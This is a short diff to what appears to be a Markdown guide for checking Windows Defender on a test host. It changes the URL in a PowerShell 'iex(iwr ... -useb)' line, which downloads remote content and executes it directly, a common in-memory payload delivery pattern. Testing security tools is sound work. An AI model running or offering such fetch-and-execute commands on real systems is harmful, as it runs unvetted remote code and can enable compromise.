@@ -179,7 +179,7 @@ Verify that Defender is enabled and execute up on test host
 ```powershell
 (Get-MpPreference).DisableRealtimeMonitoring
 
-iex(iwr "http://www.bleepincomputer.com/test" -useb)
+iex(iwr "http://www.bleepincomputer.com/deals" -useb)
 ```
 
 Verify Defender is on on remote host
